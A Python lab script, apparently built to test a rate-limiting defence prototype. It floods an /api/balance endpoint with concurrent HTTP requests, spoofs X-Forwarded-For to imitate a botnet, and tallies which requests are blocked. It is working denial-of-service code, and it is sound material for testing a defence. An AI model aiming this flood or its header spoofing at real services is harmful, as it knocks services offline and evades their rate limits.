#!/usr/bin/env python3
"""
HTTP flood attack client for the defence demonstration.

Sends concurrent requests to the target server as fast as possible and
tracks response codes. Supports a distributed mode that spoofs
X-Forwarded-For to simulate requests arriving from many source IPs.

This is a lab tool. Run only against the defence prototype on your own
machine, never against any system you do not own or have written
authorisation to test.
"""

import argparse
import csv
import os
import random
import threading
import time
from datetime import datetime
import requests


class AttackClient:
    def __init__(self, target: str, threads: int, duration: int,
                 distributed: bool = False, bots: int = 1):
        self.target = target.rstrip("/")
        self.threads = threads
        self.duration = duration
        self.distributed = distributed
        self.bot_ips = [
            f"172.16.{random.randint(0, 255)}.{random.randint(1, 254)}"
            for _ in range(bots)
        ] if distributed else []

        self._lock = threading.Lock()
        self._running = False
        self.total_requests = 0
        self.ok = 0
        self.blocked_429 = 0
        self.blocked_403 = 0
        self.failed = 0
        self.log: list[dict] = []

    def _headers(self) -> dict:
        if self.distributed:
            return {"X-Forwarded-For": random.choice(self.bot_ips)}
        return {}

    def _worker(self):
        session = requests.Session()
        while self._running:
            try:
                r = session.get(
                    f"{self.target}/api/balance",
                    headers=self._headers(),
                    timeout=2,
                )
                with self._lock:
                    self.total_requests += 1
                    if r.status_code == 200:
                        self.ok += 1
                    elif r.status_code == 429:
                        self.blocked_429 += 1
                    elif r.status_code == 403:
                        self.blocked_403 += 1
                    else:
                        self.failed += 1
            except requests.exceptions.RequestException:
                with self._lock:
                    self.total_requests += 1
                    self.failed += 1

    def _monitor(self):
        start = time.time()
        prev_total = 0
        print(f"{'time':>7} {'total':>8} {'rps':>6} {'ok':>6} "
              f"{'429':>6} {'403':>6} {'fail':>6}")
        while self._running:
            time.sleep(1)
            with self._lock:
                total = self.total_requests
                ok = self.ok
                b429 = self.blocked_429
                b403 = self.blocked_403
                fail = self.failed
            elapsed = time.time() - start
            rps = total - prev_total
            prev_total = total
            print(f"{elapsed:6.1f}s {total:>8} {rps:>6} "
                  f"{ok:>6} {b429:>6} {b403:>6} {fail:>6}")
            self.log.append({
                "time": round(elapsed, 1),
                "total": total,
                "rps": rps,
                "ok": ok,
                "blocked_429": b429,
                "blocked_403": b403,
                "failed": fail,
            })

    def run(self):
        print(f"Target   : {self.target}")
        print(f"Threads  : {self.threads}")
        print(f"Duration : {self.duration}s")
        if self.distributed:
            print(f"Mode     : distributed ({len(self.bot_ips)} spoofed bots)")
        print()

        self._running = True
        threading.Thread(target=self._monitor, daemon=True).start()

        workers = [
            threading.Thread(target=self._worker, daemon=True)
            for _ in range(self.threads)
        ]
        for w in workers:
            w.start()

        time.sleep(self.duration)
        self._running = False
        time.sleep(1.0)

        with self._lock:
            total = self.total_requests
            ok = self.ok
            b429 = self.blocked_429
            b403 = self.blocked_403
            fail = self.failed
        blocked = b429 + b403

        print()
        print(f"total requests : {total}")
        print(f"successful 200 : {ok} ({ok / max(total, 1) * 100:.1f}%)")
        print(f"blocked 429    : {b429}")
        print(f"blocked 403    : {b403}")
        print(f"total blocked  : {blocked} ({blocked / max(total, 1) * 100:.1f}%)")
        print(f"failed / error : {fail}")
        print(f"average rps    : {total / self.duration:.0f}")

        os.makedirs("logs", exist_ok=True)
        path = f"logs/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(path, "w", newline="") as f:
            writer = csv.DictWriter(
                f,
                fieldnames=["time", "total", "rps", "ok",
                            "blocked_429", "blocked_403", "failed"],
            )
            writer.writeheader()
            writer.writerows(self.log)
        print(f"log saved      : {path}")


def main():
    parser = argparse.ArgumentParser(description="HTTP flood attack client")
    parser.add_argument("--target", default="http://localhost:5000")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--duration", type=int, default=30)
    parser.add_argument("--distributed", action="store_true",
                        help="Spoof X-Forwarded-For to simulate a botnet")
    parser.add_argument("--bots", type=int, default=20,
                        help="Number of spoofed source IPs")
    args = parser.parse_args()

    AttackClient(
        args.target, args.threads, args.duration,
        args.distributed, args.bots,
    ).run()


if __name__ == "__main__":
    main()